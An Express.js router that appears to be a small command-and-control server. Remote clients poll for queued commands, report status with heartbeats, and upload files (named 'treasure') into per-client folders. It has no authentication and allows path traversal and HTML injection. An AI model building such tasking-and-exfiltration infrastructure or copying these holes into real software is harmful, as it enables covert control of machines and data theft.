var express = require('express');
var router = express.Router();
var htmlize = require('json-htmlize');
var fs = require('fs');

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Command' });
});

function encrypt(content) {
    return content;
}

router.post('/command', function (req, res, next) {
    console.log(req.body);
    var command = JSON.parse(req.body.command);
    var id = Date.now();
    fs.mkdir('./uploads/'+id);
    req.app.locals.command = JSON.stringify([id].concat(command));
    res.render('success');
});

router.get('/command', function(req, res, next) {
    res.send(req.app.locals.command);
});

router.post('/report', function(req, res, next) {
    console.log(req.body);
    req.app.locals.report[req.body.id] = { content: req.body.content, 'last-tick': Date.now()};
    res.sendStatus(200);
});

router.get('/report', function (req, res) {
    var htmlString = htmlize.toHtmlString(req.app.locals.report || "");
    res.end("<body>" + htmlString + "</body>");
});

router.get('/alive', function (req, res) {
    var tmp = {};
    var rep = (req.app.locals.report || {});
    for ( var key in rep) {
        console.log(Date.now() - rep[key]['last-tick']);
        if (Date.now() - rep[key]['last-tick'] < 60000) {
            tmp[key] = {
                content : rep[key]['content'],
                'last-tick' : (new Date(rep[key]['last-tick'])).toString()
            };
        }
    }
    var htmlString = htmlize.toHtmlString(tmp);
    res.end("<body>" + htmlString + "</body>");
});

router.post('/tick', function(req, res) {
    var rep = (req.app.locals.report || {});
    if (rep[req.body.id] === undefined) {
        res.sendStatus(500);
    } else {
        rep[req.body.id]['last-tick'] = Date.now();
        res.sendStatus(200);
    }
});

router.get('/upload', function(req, res) {
    res.render('upload')
});

router.post('/upload', function(req, res) {
    console.log(req.body);
    console.log(req.files);

    if ((req.body.id === undefined)) {
        res.sendStatus(500);
    } else {
        fs.rename(req.files.treasure.path, './uploads/' + req.body.id + '/' + req.files.treasure.name, function(err) {
            if (err) {
                console.trace(err);
                console.log(err);
                res.sendStatus(500);
            } else {
                res.sendStatus(200);
            }
        });
    }
});

module.exports = router;
